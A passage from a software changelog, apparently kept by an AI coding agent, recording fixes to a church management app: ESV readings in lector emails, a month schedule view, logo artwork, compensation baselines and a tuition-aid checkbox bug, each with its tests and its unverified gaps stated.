  across the whole batch before anything is requested. Ten volunteers sharing a Sunday cost 4
  lookups, not 40.
- **It can never stop an email going out.** `esvFetchPassages()` always resolves, never rejects; a
  missing key, a bad reference or a dead network leaves the map empty and every reading falls back
  to a link. The route returns `configured:false` with a 200 rather than an error, because holding
  no key is the default state, not a fault.
- Checkbox on the Email Assignments panel, on by default once a key exists, disabled with an
  explanation when not — the same shape as the office-copy control from SC10.
- **Structural change worth knowing**: both send paths built their plain-text body synchronously,
  so the readings are now spliced in at send time between the assignment bullets and the RSVP
  links (`linesHead` / `linesTail`) rather than appended after everything. `buildHtmlEmail()` and
  `readingsTextLines()` take the resolved text as an explicit argument — a global would put last
  week's readings in this week's email with nothing to show for it.

`npm test` (1448/1448, 42 new across `test/scheduler-readings.test.js` and a new
`test/esv-passage-proxy.test.js` that drives the real route handler with `fetch` stubbed).
**Every new test verified non-vacuous** by injecting the exact regression it guards — 13
injections, 13 correct failure sets. **One injection escaped and exposed a weak test of mine**: the
"unconfigured response" case was really only exercising the empty-body guard, so it was rewritten
to send text alongside `configured:false`. **One assertion of mine was also wrong** — it forbade
the string `api.esv.org` anywhere in the client, which the help text legitimately contains; it now
forbids a *request* to it and any client-side `Authorization: Token` header, which is the real
invariant. Plus `node --check` on the served `<script>` for both builds and on all three backend
files, div/brace balance, and `scheduler/index.html` resynced by evaluating the module.

**Not verified**: a live browser, a real sent email, or a real ESV API call — this environment's
egress proxy blocks `api.esv.org` and `esv.org`, so the request shape is built to Crossway's
documented v3 contract and exercised against a stub, never against the live service. The esv.org
link format was confirmed from a real indexed URL, not guessed.

**Optional step for an admin**: `wrangler secret put ESV_API_KEY` (free from api.esv.org). Without
it everything still works — readings are named and linked, just not quoted in full.

(`src/api-scheduler.js`, `src/api-admin.js`, `tlc-volunteer-worker.js`, `src/scheduler-inline.js`,
`src/scheduler-html.js`, `scheduler/index.html`, `SECRETS.md`, `src/frontend/js-core.js`,
`test/esv-passage-proxy.test.js`, `test/scheduler-readings.test.js`)

---

### v1.180.0 — SC12: the readings editor was unreachable; ESV made explicit (2026-08-16)

Asked: *"how do i set the assigned readings that the lector will get? and this is supposed to get
emailed to them. we use ESV."*

**Most of this already worked, and one thing was outright broken.** Readings auto-fill from the
LCMS lectionary shipped in `scheduler/lcms_calendar.json` (LSB, 2025–2044), and the assignment
email has always carried them — OT + Epistle to the Lector, Gospel + Psalm to the Liturgist, linked
to BibleGateway with `version=ESV`. What did not work is **setting** them.

- **⚠ The readings editor could not be opened at all.** Its only entry point was a `📖 Readings`
  button rendered by `buildSummaryInner()` into `#schedule-tbody` — and that whole table has been
  inside `<div class="table-wrapper" style="display:none;">` since the SC3 Focus Week redesign,
  retained only to feed Print and CSV. **This is the SAC2 / FIN57 class exactly**: a redesign left
  a control in a renderer that is no longer on screen, and nothing failed loudly. There was no way
  to override a reading — for a deviation from the lectionary, a special service, or a correction.
- **The fix is a readings strip on the Sunday itself**, in the pane that actually renders, showing
  what each role will be sent with an Edit/Add control. Present in both the week and month views
  (it lives in the shared `focusWeekRowHtml`, so it could not be in one and not the other), and
  **not** swept up by the phone rule that hides `.btn-edit-readings`.
- **One split, three surfaces.** New `readingsForRole(role, rd)` defines who receives which
  reading; the on-screen strip, the HTML email and the plain-text email all call it. The plain-text
  half was **two hand-inlined copies** of that split across the two send paths — the shape that
  drifts (SW17) — now one `readingsTextLines()`.
- **"Reset to Lectionary" now deletes the override** instead of only refilling the boxes. Saving
  the lectionary's own values back as an override looks identical but pins the date to today's
  text, so a later lectionary correction would never reach it — and the Sunday would keep reading
  "set by hand" with nothing set by hand.
- **ESV is named, not just linked.** One `BIBLE_VERSION` constant drives the URL and the words
  printed beside it, so they cannot claim different translations. The email says ESV, the strip
  shows an ESV chip, the editor says so, and the plain-text part now carries the links too.
- **Optional verses are kept where they are read and dropped only where they break.** The
  lectionary writes `Romans 13:( 8-10 ) 11-14`; parentheses mark optional verses, so new
  `tidyReadingRef()` only fixes the scraped spacing for display (`Romans 13:(8-10) 11-14`), while
  `cleanReading()` still strips them for the link, which BibleGateway cannot parse. Also closed a
  small pre-existing gap there: removing the parentheses left `Romans 13: 11-14` with a stray space.
- Saving a reading now also `queueD1Push()`es and repaints, so a correction reaches the server and
  the strip is never stale. (`ws_readings` was already in the D1 sync key list.)

`npm test` (1419/1419, 29 new in `test/scheduler-readings.test.js`, running the real served script
in a `vm`). **Every new test verified non-vacuous** by injecting the exact regression it guards —
9 injections, 9 correct failure sets. **Three of my own assertions were wrong and were corrected,
not forced**: two counted a function's own definition as a call site and sliced a handler body by a
guessed character count (which silently asserts nothing — now sliced to its real closing brace),
and one demanded a link form the code did not produce, which turned out to be the real spacing gap
above. Plus `node --check` on the served `<script>` for both builds, div/brace balance, and
`scheduler/index.html` resynced by evaluating the module (SC5), byte-identical.

**Not verified**: a live browser or a real sent email.

**Nothing to configure** — a normal Sunday needs no setup; the lectionary fills it in.

(`src/scheduler-html.js`, `scheduler/index.html`, `src/frontend/js-core.js`,
`test/scheduler-readings.test.js`)

---
### v1.180.0 — Login uses the designer's own lockup artwork (2026-08-16)

**⚠ Version collision on the way in, worth knowing about.** A parallel session shipped its own
work while this was in flight and **reused `1.179.0`** — `main` now carries three separate
`### v1.179.0` entries, and `DEPLOY_VERSION` was left at `1.179.0` for all of them. Since that
constant is the cache-buster on the immutable app-JS routes, **a browser that had already loaded
the first 1.179.0 would not re-fetch the later ones**. This release's bump to `1.180.0` clears it
for everybody. When two sessions run at once, re-read `DEPLOY_VERSION` from `origin/main`
immediately before pushing rather than incrementing the value you started from.


The sheet was re-sent with no message. **Checked before acting: it is byte-identical to the first
upload** (same sha256, same 1248x832, 108,116 bytes) — so it carries no new resolution, and the
teal/240px limitations recorded in BRAND2 still stand.

What it did surface is that **the app's wordmark was still a CSS recreation**, and rendering the
designer's lockup beside it made the gap obvious: theirs is markedly heavier and tighter than DM
Sans 600 at .13em, and carries the rule, church name and tagline.

- **Login page now uses their actual lockup**, cropped from the sheet (`icons/connect-lockup.png`)
  — mark, wordmark, rule, church name, tagline, exactly as drawn. Five recreated CSS rules and the
  separate mark `<img>` collapse into one image. Alt text carries the full wording.
- **⚠ The crop needed its background snapped to pure white.** The sheet is a WebP, so its "white"
  is compression noise around #f8–#fe, which reads as a faint gray panel against the login card's
  #fff. Everything ≥242 is now #fff (safely above the tagline's mid-gray, so no text washed out) —
  which also cut the file from 71 KB to 48 KB.
- **Sized deliberately at 480px, not the 636px native crop.** The login page is where AU2 already
  flags slow first paint on the church's network; 480 still gives ~1.6x density at its 300px
  display size.
- **Topbar/sidebar wordmarks stay CSS** — they must stay crisp at 15px and adapt — but now match
  the artwork's weight (700, not 600) and tracking (.05em/.08em, not .13em/.14em).

`npm test` (1346/1346, unchanged). Plus `node --check` on all three bundles and the worker, brace
balance, div balance on both shells and the login page, a check that no dead `wm-*` class survives,
and a backtick sweep of `html-head.js` (0 stray — the v1.179.0 lesson). **Not verified**: a live
browser. (`icons/connect-lockup.png`, `src/html-templates.js`, `src/frontend/html-head.js`,
`tlc-volunteer-worker.js`)

### v1.179.0 — SC10/SC11: office copy of the printable schedule, and a whole-month view (2026-08-16)

Two asks off the Scheduler, from the Schedule tab: *"in the email volunteers, i also want the
printable schedule emailed to my office asst"* and *"can i have a toggle to be able to see the
whole month at one time."*

**SC10 — the printable schedule, emailed to the office.** The Email Assignments panel gains a
checkbox, *Also send the printable schedule to the office*, with a scope select (**This Sunday
only** / **Whole month**) and a new **Office Copy Address** field in Settings → Integrations
(stored on the existing `ws_breeze_settings` blob, so it rides the same D1 sync as Reply-To —
no migration, no endpoint).

- **It is the same sheet the Print button produces, not a second one.** `ppBuildMonthHtml()` now
  takes an optional row set and title, so a single Sunday is that same table with one row in it.
  A second hand-written layout is how the emailed sheet and the printed sheet come to disagree
  (SW17), and there would be no way to notice.
- **Deliberately NOT the Single-Sunday print layout**, which is the obvious choice and the wrong
  one: that layout is built from `display:flex` rows, which Outlook does not lay out, so it
  arrives as a stack of unaligned lines. The month table is plain table markup and travels intact.
  A test pins this.
- **The office copy is sent last**, chained onto the same promise chain as the per-volunteer
  sends, so the sheet it carries is never contradicted by a send still in flight behind it. The
  checkbox is read **before** the send disables the panel — read afterwards it reports the
  disabled state and the copy silently never goes out.
- **The result is reported in the panel's status line either way** ("Printable schedule sent to
  …" / "Office copy not sent (…)"), and the volunteer pass's own failure text is preserved
  across the office step rather than being overwritten by the interim "sending" line.
- Fails visibly, not silently: with no address configured the checkbox is disabled and the panel
  says where to set one, rather than offering a box the send cannot honor.

**SC11 — Week / Month toggle.** A seg-switch beside the "Schedule" heading. Month mode stacks
every Sunday of the loaded month in the detail pane and hides the week rail (a rail is a week
*picker*, with nothing to pick once every week is on screen). The choice persists in
`localStorage` and is restored **before** the first render, so a month-view user never sees a
week-view flash.

- **Both views are the same call**, not two renderers: `focusWeekRowHtml(rowIdx, pMap)` was
  extracted out of `renderFocusWeekDetail` and month mode only wraps each result in
  `.fw-month-sec`, which is what shrinks the heading — via CSS on the wrapper, not a second code
  path. A test asserts the week view's markup appears verbatim inside the month view's.
- Every Sunday's role rows keep their **own** `rowIdx`, so the picker and the confirmation pills
  work identically in month mode; a shared or zero index would make edits on the 2nd and 3rd
  Sundays silently write to the 1st. Pinned by a test.

**Verification.** `npm test` (1380/1380, 34 new in `test/scheduler-month-office.test.js`, which
runs the **real served script** — extracted from `SCHEDULER_HTML` — in a `vm` with a minimal DOM,
and drives `_sendWeekReminders()` end to end with `fetch` recorded). **Every new test verified
non-vacuous** by injecting the exact regression it guards: 16 injections, 16 correct failure
sets. **Two of my own tests were vacuous and were rewritten, not trusted** — the single-Sunday
scope assertion passed against an empty table because the date also appears in the title, and the
workerUrl-shape assertion used a lazy regex that ran past its own function into the per-volunteer
send further down. Plus `node --check` on the served `<script>` for both the standalone and the
ChMS-embedded builds (the SC3-BUG1 class), div balance on the whole page / the embedded
`.sched-root` markup / `CHMS_HTML` / each new subtree, and `<style>` brace balance.
`scheduler/index.html` resynced by evaluating the module (per SC5) and confirmed byte-identical.

**Not verified**: a live browser, a real sent email, or a real phone.

**One step for an admin before the office copy can be used**: Scheduler → Settings → Integrations
→ **Office Copy Address**, then Save Settings. Until then the checkbox stays disabled.

(`src/scheduler-html.js`, `scheduler/index.html`, `src/frontend/js-core.js`,
`test/scheduler-month-office.test.js`)

---
### v1.179.0 — Compensation: the base year must cover the same PEOPLE (2026-08-14)

Second report on the same strip, in the opposite direction: with FIN66's scope and period fixes
live, "No raise" read **−$28,752 (−6.1%)** — flat salaries, rising benefit rates, and the plan
somehow cheaper than the base year. Which is as wrong as the +34% before it.

**Same class of defect, one level down. Not the cost categories this time — the population.** The
FY{target} total covers exactly the counted roster. The FY{base} figure covers whatever the ledger
paid: departed workers, vacant posts, and anyone deliberately excluded as *paid from another
budget* (FIN57's `externallyFunded` — this church has an MDO worker in exactly that position).
Left in, the base year is a bigger group of people than the plan, and a flat plan reads as a
saving.

Each base-year row is now attributed: a leading account code off the label, matched against the
counted roster's own `accountCode`. Rows split three ways — **salaries for people on this roster**,
**pooled benefits & taxes** (charged for the whole staff on one line, so never attributed to one
person), and **salaries for people NOT on this roster**, called out by name and figure with the
direction of the bias stated in words. One click leaves them out.

**Deliberately not defaulted on.** Silently changing the headline is what makes a number
untrustworthy, and this one has already moved twice. The default counts everything, exactly as
before, and the note leads with what it found. **And the restriction refuses to apply when NO
salary account is attributed** — an unlinked roster matches nothing, so applying it would delete
the whole salary side of the base year and invent a far worse number than the one it set out to
fix.

`/tax/` was added to the pooled-cost test on purpose: "59040 Payroll Taxes" matches `/payroll/` in
the account filter above it and would otherwise read as somebody's wages and be attributed to a
person.

The note also now states what it still cannot see: an account named some other way is not counted
at all, and a pooled benefit line covers everyone the church paid that year — so if a
not-on-roster worker's wages are in the base, their pension and FICA are too, and no split of that
line would be anything but invented.

`npm test` (1356/1356, 10 new). **Every new test verified non-vacuous** by injecting the exact
regression it guards (4 injections, 4 correct failure sets) — including one that turns the
reported symptom around: a flat plan against a base year holding one stranger reads as a saving,
and reads as a real increase once the stranger is out. Plus `node --check` on all four bundles,
brace balance on `app.css`, div balance on `CHMS_HTML`. **Not verified**: a live browser, or this
church's real ledger. (`src/frontend/js-finance.js`, `src/frontend/html-head.js`,
`test/finance-comp-baseline.test.js`)
### v1.179.0 — The lockup is on screen; pillar pills removed (2026-08-14)

Reported with a desktop screenshot: "the logo design didnt get added here." Correct — **the mark
only ever lived in the sidebar, and the sidebar is an off-canvas drawer at every width** (VUX10),
so unless you opened the hamburger the app showed no branding at all. The asset itself was fine
(`/icons/connect-mark.png` verified live: 200, valid 248px PNG).

Now the **full lockup**, per the follow-up ("add the full name logo design and not just the simple
logo"):
- **Topbar** — the horizontal form: mark + `CONNECT` wordmark, click-to-Home, persistent on every
  page. The wordmark hides below 767px (the mark alone still reads as Connect) — see the overflow
  measurements below.
- **Sidebar** — the stacked form, mirroring the login page: mark, `CONNECT`, rule, church name.
  The 200px rail has the room for it.

**Pillar pills removed** ("remove all the pills at the top on each page"). The PEOPLE / MINISTRY /
GIVING pill from the BR2 three-pillar branding is gone: markup, the `pillars` map and painter in
`showTab()`, and all five `.pill-section` CSS rules. No references remain.

**⚠ A backtick in one of my own new CSS comments closed the outer `String.raw` literal** and broke
the whole stylesheet module — the SC3-BUG1/FIN15 class again. It was caught only because a build
error surfaced after I stopped piping stderr to `/dev/null`; **for several minutes before that,
every "rebuild" silently kept serving the previous `app.css`, so a real fix looked like it had no
effect.** Do not suppress stderr on the harness build.

**Topbar overflow, measured rather than assumed** (long title + version + role chip + Sign Out):
it already overflowed **31px at 360px before any branding existed**, and the mark added 40 more.
Two fixes: `.topbar-title` gets `min-width:0` + ellipsis (a flex item's default `min-width:auto` is
its content width, so `flex:1` could not actually shrink), and dropping the pill frees ~100px.
Result: **0 overflow at 430 / 390 / 360 / 320**, with Sign Out on screen at every width — better
than before this change.

`npm test` (1346/1346, unchanged — no test asserted on the pill). Plus `node --check` on all three
bundles, `app.css` brace balance, div balance on both shells, and a check that no `topbar-pill` or
`pill-section` reference survives anywhere. **Not verified**: a real phone.
(`src/frontend/html-head.js`, `src/frontend/js-core.js`)

### v1.178.0 — VOL-MOB1: the Volunteers tab clipped its own buttons on a phone (2026-08-14)

Reported from an iPhone: the Volunteers tab "doesn't seem like it is rendering as native and more
like it is in a window." **Reproduced before changing anything**, by driving the real built bundles
in a browser at phone width and measuring `scrollWidth` vs `clientWidth` on every element in the
tab — not by reading the CSS.

**The "window" is the tab clipping itself.** A signup row laid its name block and its action
cluster side by side in one flex row; the cluster is `flex-shrink:0`, so at phone width it pushed
**~100px past the card**. `.vol-shell` is `overflow:hidden` — it has to be, to clip the navy
sub-nav to the card's own radius — so that overflow was **clipped, not scrollable**: **Link /
Email / Remove were invisible and unreachable**, with no scrollbar to hint they existed. The sliver
of a cut-off button at the right edge of the report's screenshot is exactly this.

**⚠ The fix could not be a media query.** The row's layout was an inline `style=`, and an inline
style beats a media-query rule (VUX15/MOB1, twice before in this codebase). The declarations had to
MOVE onto a class first — **carried over verbatim, so desktop computes identically** — and only
then can the phone rule stack them. Same for the tab's wrapper padding.

Also fixed, measured rather than guessed:
- **The tab padded twice** — `.tab-panel`'s 24px plus an inner wrapper's 20px, i.e. **88px of a
  390px phone** spent on margins, which is most of why the shell read as a floating window. Phone
  now trims to 10px (`#tab-volunteers` — an id, so it beats `.tab-panel` with no `!important`).
- **The sub-nav scrolled for the sake of 4px.** At 390px the four items overshot by *four pixels*,
  so the strip scrolled and clipped "Signups" mid-word. Tightening padding/gap buys ~28px and it
  now fits 390 outright. 360 and below still scroll — that is what `overflow-x` is for, and a test
  pins that it stays.

Verified by re-measuring all four sections (Signups / Ministry Roles / Events / Templates) at 500 /
430 / 390 / 360 / 320: **every overflow is now 0** except the sub-nav below 390, which is
deliberate. `npm test` (1346/1346, 9 new in `test/volunteers-mobile.test.js`); **every new test
verified non-vacuous** by injecting the exact regression it guards (5 injections, 5 correct
failures — one injection silently failed to apply on a quoting error and was redone before it
counted). Plus `node --check` on all three bundles, `app.css` brace balance, and div balance on
both shells and the `#tab-volunteers` subtree. **Not verified**: a real phone.
(`src/frontend/html-head.js`, `src/frontend/html-tabs.js`, `src/frontend/js-volunteers.js`,
`test/volunteers-mobile.test.js`)

### v1.177.0 — Connect logo: use the supplied artwork, not a redraw (2026-08-14)

v1.176.0 shipped a **redrawn** mark, because the concept arrived as images in the conversation and
I concluded no file existed to work from. That was wrong twice over: the drawing did not match, and
**the uploads were on disk the whole time** — Claude Code stores conversation attachments as base64
image blocks in the session transcript (`~/.claude/projects/<project>/<session>.jsonl`), decodable
with `json` + `base64`. **Check there before ever concluding a supplied file is unavailable.**

**The real mark is nothing like the redraw.** It is a **compass/crosshair**: a white center disc
ringed by four quadrant arcs, with four radial arms on the axes — and each arm is **split down its
axis**, half belonging to each neighboring quadrant, so the four colored pieces each read as
half-arm → arc → half-arm. The v1.176.0 drawing was a square bracket frame. Not close.

**⚠ The v1.176.0 pinwheel/swastika concern does not apply to the real artwork and was an artifact of
my own construction.** The genuine mark's silhouette is a symmetric ring-and-cross. Nothing to fix.

**What ships now is their pixels.** The hero mark was located in the sheet by scanning for saturated
color (x 300–539, y 59–297, a 240×240 crop), the white background removed by flood fill from the
border, and — because the axis gaps let that flood leak into the middle — **the mark's own white
center disc restored** by measuring the ring's inner radius (61px, from 360 radial rays taking the
first strongly-saturated hit; 241 of them agree). Icons are composited in a browser over the navy
tile and downsampled by the same pure-Python PNG codec as v1.176.0.

**⚠ Two limits of the source, both worth fixing upstream rather than in code:**
- **The artwork contradicts its own palette.** Sampled from the ring: top-right and bottom-right are
  **both `#1860A8`**, so RECEIVE's blue is used twice and **GROW's teal `#3BA9B2` appears nowhere in
  the mark**. The legend declares four colors. Shipped verbatim rather than silently recolored — the
  fix belongs in the source file. The `--val-*` tokens now carry the sheet's declared palette and
  say so.
- **Resolution ceiling: the largest instance of the mark anywhere in the sheet is 240px.** The
  512 icon is a ~1.5× upscale of a WebP-compressed raster, and at 16/32px the detailed church is a
  smudge — v1.176.0's simplified Latin cross was genuinely more legible there, but substituting it
  would be redrawing again. **A vector (SVG/AI/PDF/EPS) from the designer fixes both.**

`npm test` (1337/1337, unchanged). `node --check` on all three bundles and the worker, `app.css`
brace balance, div/svg balance on both shells and the login page, icon route regex re-checked.
Verified visually against the real built login page and app shell. **Not verified**: a real browser
with fonts loaded, a phone home screen, or an installed PWA. (`icons/*`, `favicon.svg`,
`src/frontend/html-head.js`, `src/html-templates.js`, `tlc-volunteer-worker.js`)

### v1.176.0 — Connect logo applied: the "Four Paths Together" mark (2026-08-14)

Two logo concepts were presented (Option 3 "Four Paths Together", Option 2 "Four Corners Frame");
Option 3 was chosen and is now the app's mark, replacing the three-circle mark that shipped with
the TLC Gather rebrand (BR2) and survived the rename to Connect.

**The mark is redrawn, not traced.** No vector source came with the concept — only a flat
presentation image — so the geometry here is an interpretation built from the concept's own
description ("four distinct paths converge toward the cross and church"), and two things were
decided rather than copied:

- **⚠ The arms are mirror-symmetric, deliberately.** The first construction gave each color one
  bent arm rotated 90° from the last. That is a pinwheel, and four identically-bent arms around a
  center is the swastika silhouette — on a church logo, at favicon size, where nobody reads the
  colors. It was rejected on sight of the render. The shipped mark is a **square bracket frame plus
  an inner cross**: four corner brackets and four inward arms, a silhouette with full four-fold
  mirror symmetry. Each value still owns one bracket and one arm, so the four-paths story and the
  color assignment are unchanged — only the *shape* is symmetric. **Do not "restore" the rotated
  version.**
- **Two glyphs, not one.** The concept's center is a church building with a steeple cross. That
  detail is gone by ~32px, so the center is a **church at 40px and up** (`connect-mark.svg`) and a
  **Latin cross at 16/32px** (`connect-mark-simple.svg`). The cross is Latin, not Greek — a
  symmetric plus in a white circle reads as a medical mark, which is what the first draft looked
  like.

**Colors are the logo's, and they are not the UI's.** New `--val-welcome` / `--val-receive` /
`--val-grow` / `--val-go` tokens (`#4DAA6B` / `#1D63B3` / `#21A9B3` / `#F5B731`) sit beside the
existing brand tokens. They are brighter than `--color-teal`/`--color-gold` and are **for the mark
only** — repointing the UI palette at them would move every chart, chip and status color in the
app, which is RD1/PAL2's job, not a logo swap's. The comment in `:root` says so.

**Where it lands**: sidebar mark (inline SVG, now `var(--val-*)` rather than hardcoded hex, per
PAL5); login page, which gains the full lockup from the concept — mark, `CONNECT` letterspaced,
rule, church name, and the "From our Neighborhood to the Nations" tagline. The lockup uses **DM
Sans 600 and Cormorant Garamond italic, both already loaded**, so it adds no font request (AU2).
The `.s-logo` navy tile is gone — the sidebar is already navy, so the tile was invisible and only
cost the mark 2px.

**The icon PNGs were regenerated, and the generator is worth knowing about.** There is no Pillow
here, and Chromium's `--screenshot` is not a reliable rasterizer: below ~64px it emits corrupt
output, and at every size it silently loses ~87px of viewport height to browser chrome, so a
`--window-size=1024,1024` render is really 1024×937 with the bottom cut off. Both were caught by
checking pixel alpha, not by looking. Every size is now derived from **one 1024px render, cropped,
then area-downsampled** by a small pure-Python PNG codec (`zlib` only, alpha-premultiplied so
transparent edges can't bleed).

`npm test` (1337/1337, unchanged — this is markup and assets, no logic). Plus `node --check` on all
three bundles and the worker, `app.css` brace balance, div/svg balance on the admin shell, the
member shell and the login page, and a check that the icon route regex serves all five new SVGs and
no longer serves the retired one. **Verified visually by rendering the real built login page, the
real app shell with the sidebar open, and the full icon family** — screenshots reviewed at 1:1 and
zoomed. **Not verified**: a real browser with the Google Fonts request satisfied (the headless
render falls back to system fonts, so the shipped `CONNECT` will be DM Sans 600 rather than what
the screenshot showed), a real phone home screen, or an installed PWA.

**⚠ The icons will not change until this merges.** `/icons/*` and `/favicon.svg` are proxied from
`raw.githubusercontent.com/.../main`, not bundled, so a branch deploy still serves the old mark.
They also carry `max-age=86400`, so an already-installed PWA or a warm browser cache can show the
old icon for up to a day after merge. (`icons/*`, `favicon.svg`, `src/frontend/html-head.js`,
`src/html-templates.js`, `tlc-volunteer-worker.js`)

### v1.175.0 — Compensation: the "vs FY{base}" comparison, and a % of scale method (2026-08-14)

Reported from the Compensation strip: **"No raise applied to all 7 workers"** printed next to
**+$111,624 (+34.0%)** against FY2026. No raise cannot cost a third more, and the reporter's own
guess — *are you not counting benefits in 2026 and then counting them for 2027?* — was right.

**Two independent errors, both pulling the same way.**

1. **Scope.** The FY{target} total is salary + pension + disability + health + employer FICA. The
   FY{base} figure matched only `/salar|payroll|compensation|wages/` and
   `/health|medical|dental|vision|disability/` — **no pension, no payroll taxes**. Two whole cost
   categories were charged on the plan side and never looked for on the base side, so the plan was
   answering a broader question than the figure it was subtracted from.
2. **Period.** `totalActualCents` for a base year still in progress is **year-to-date**, and the
   plan is a whole year. In August that compares roughly eight months against twelve.

Fixed together in `finCompBaselineDetail()`: the account match gains pension/retirement/FICA/social
security, and each account resolves to its own full-year **budget** when it has one, otherwise its
actual **annualized** by the same 52/weeks the Planning tab uses — the same rule, so the two pages
cannot disagree. Deliberately **not** `/concordia/`, which would have swept "Concordia Children's
Services" (benevolence forwarded to a third party) into the church's own staff cost; deliberately
still not a bare `/insurance|benefit/`, which is why "52040 Insurance" (property cover) stays out.
Income accounts are excluded by classification, so "40085 Retirement Distribution" cannot creep in
through the new `retirement` term.

**The card now prints its own working** — which ledger accounts were counted, each one's basis
(budget / annualized / actual), what the plan side holds, and the two things the comparison cannot
see: an account the church names some other way is not counted, and the base year covers whoever
was on the payroll then, which need not be the roster counted above. A percentage nobody can check
is a percentage nobody should act on (the FIN63 lesson). The same block prints on the Council
report, and the motion no longer calls the base figure "actual spending" when it is annualized.

**New growth method: `X% of Scale`** (`scalepct`), sitting beside District Scale because it is the
same figure at a chosen fraction — how a congregation that cannot reach full scale in one year
sets a deliberate step toward it, rather than a percentage raise off whatever it pays now. Its own
editable % box, applied per column or per cell like the others, persisted with the planner
(`compScalePct`). Returns **null, not 0**, for a worker with no district figure — a share of a
scale that does not exist is unanswerable, and a zero there would quietly propose cutting someone
to nothing. The add-a-worker row's colspan is now derived from `FIN_COMP_METHODS.length` instead of
hardcoded, so a sixth method cannot silently break the table.

`npm test` (1337/1337, 20 new in `test/finance-comp-baseline.test.js`, running the real bundle in a
`vm`). **Every new test verified non-vacuous** by injecting the exact regression it guards (6
injections, 6 correct failure sets) — one injection's `perl` escaping silently failed and reported
a pass, so it was redone in Python and then failed correctly, which is the only reason it counts.
Plus `node --check` on all four bundles, brace balance on `app.css`, div balance on `CHMS_HTML`.
**Not verified**: a live browser or this church's real ledger — the +34% figure itself cannot be
reproduced from here, only the two defects behind it. (`src/frontend/js-finance.js`,
`src/frontend/html-head.js`, `test/finance-comp-baseline.test.js`)

### v1.174.0 — Budget tree reads like QuickBooks; Unapplied Cash hidden (2026-08-14)

Three things reported together off the Planning tab.

**Totals now sit under their accounts.** Every group printed its figures on a header ABOVE its
account lines; QuickBooks prints them underneath as a computed "Total X", which is what the church
reads the budget against. FIN20 had already moved the top-level classification totals down in the
Church Report, but only those — every group inside them still headed its section with the sum, and
the Planning table did it at every level including the roots.

One shared `finRenderTreeQbOrder(nodes, render, out)` now drives both tables: a group renders as a
bare label row (no figures — printing them there and again four lines down is the same number
twice, and the top copy reads as though the accounts beneath were a breakdown of something already
counted), then its accounts, then its total. Shared rather than written twice, because two
hand-inlined copies of one reading order is how they drift (SW17).

Two consequences handled rather than left: a "Total X" row is shaded only at depth 0, since
shading every group now that all of them carry totals turns the table into stripes with no
hierarchy left to read; and Planning's section subtotal row is skipped when a section has exactly
one root, because that root now prints its own total and the subtotal would be the identical
figure on the very next line. It is still emitted when a section has several roots (Income + Other
Income), where no one root's total covers the section.

**Unapplied Cash Bill Payment Expense.** A QuickBooks artifact — it appears on a cash-basis report
for a bill payment not applied to a bill — dropped from every account tree by
`finPruneEmptyUnappliedCash`. **Only when it is empty.** A row carrying real money stays, with a
`title` explaining what it is, because hiding a dollar that a total on the same screen still
counts is exactly the defect FIN58 existed to fix; FIN60 set the same zero-only rule for Cost of
Goods Sold.

**Altar Guild.** Reported as a restricted gift while showing under Passive Income. **On this
church's live data that is a saved setting, not a bug** — Data & Imports → Classification & policy
has "48 Other Income" pinned to Passive, and a saved classification rightly beats any rule. What
IS fixed is the guess behind it: `classifyRevenueStream` reads only the GROUP label, and the
restricted rule spells out "altar guild" — but this church files it as account 48001 inside a
group named "48 Other Income", one level below the only string the rule ever saw, so the rule
could never once fire and the group defaulted to `earned`. It now falls back to the accounts
inside a group whose label matches nothing, and adopts an account-derived stream **only when every
money-carrying account in the group agrees** — a mixed bucket has no single right answer, and
guessing one would move real money between streams on the Health page. $0 accounts and the group's
own header row are ignored, so an empty line cannot veto the guess.

`npm test` (1317/1317, 17 new in `test/finance-qb-order.test.js` — the real renderers out of the
shipped bundle in a `vm`, plus the pure classifier). **Every new test verified non-vacuous** by
injecting the exact regression it guards (7 injections, 7 correct failure sets). Two existing
harnesses needed their extraction lists extended for the new helpers. Plus `node --check` on the
backend and all four built bundles, brace balance on the served `app.css`, div balance on
`CHMS_HTML`. **Not verified**: a live browser or real D1. (`src/frontend/js-finance.js`,
`src/api-finance.js`, `test/finance-qb-order.test.js`, `test/finance-church-tree.test.js`,
`test/finance-church-detail-body.test.js`)

### v1.173.0 — Tuition Aid: "Plans to attend LHS" saves; the % slider is gone (2026-08-14)

Reported together: unchecking **Plans to attend LHS** on the Tuition Aid planner doesn't save, and
the Family Share % slider should go.

**The checkbox.** Every `attends_lhs` write bound `v === false ? 0 : 1` — an identity test against
the boolean `false`. The frontend sends the field as **1/0**, not true/false (`tapSetAttendsLHS`:
`attends_lhs: checked ? 1 : 0`), and `0 === false` is **false** in JavaScript, so an explicit "no"
fell to the `: 1` branch and stored a yes. The write could only ever be a no-op, never a
wrong-direction save — which is exactly why the symptom reads as "the checkbox does nothing": the
row already held 1 and 1 is what went back. It looked fine until a reload because the local UI
state is set by the caller before the save. Present on all three write paths (`POST`, `PATCH`,
bulk) since the planner shipped.

Fixed with two named helpers rather than another inline ternary, because the two cases genuinely
differ: `tapAttendsLhsFlag` (update paths — the field is only bound when explicitly present, so
every falsy form means no) and `tapAttendsLhsDefaultTrue` (create only — absent means yes, the
column's default, but an explicit 0 is still honored). `'0'`/`'false'` are spelled out: this is a
boolean arriving over JSON, where both are truthy strings and a bare truthiness test would store
the opposite of what the caller said.

**Beyond a checkbox**: `attendsLHS` is what marks a departing 8th grader as *Departed* instead of
rolling them into next year's LHS awards, so a stuck 1 is a budget figure.

**The slider.** The K-8 Family Share % cell had a drag slider and a number box for one value; the
range input is gone and the typed % stays. Two things moved with it rather than being dropped
silently: the over-budget red rode `input[type=range].over`, so it now rides the number box (new
`.tap-slider-row input[type=number].over` rule), and `tapSliderChange` no longer writes the
clamped value back into the box being typed in — with no second control left to mirror there is
nothing legitimate left to write, and rewriting a focused input's own value mid-keystroke is the
controlled-input round-trip that made the Finance boxes type backward (FIN52). The LHS award
slider is dollars, was not the ask, and is untouched.

`npm test` (1300/1300, 15 new in `test/tuition-attends-lhs.test.js` — the pure helpers plus the
real PATCH/bulk/GET routes against real in-memory SQLite). **Every new test verified non-vacuous**
by injecting the exact regression it guards: restoring `v === false ? 0 : 1` fails 7 and
reproduces the report, and the three frontend injections each fail their own one test. Plus
`node --check` on the backend and all three built bundles, and a brace-balance check on the served
`app.css`. **Not verified**: a live browser or real D1. (`src/api-tuition-aid.js`,
`src/frontend/js-tuition-aid.js`, `src/frontend/html-head.js`, `test/tuition-attends-lhs.test.js`)

### v1.172.1 — American English everywhere a human reads (2026-08-13)

House rule, now written down at the top of `CLAUDE.md` rather than assumed: **screen labels,
button text, help copy, letters sent to members, code comments, commit messages, this file and
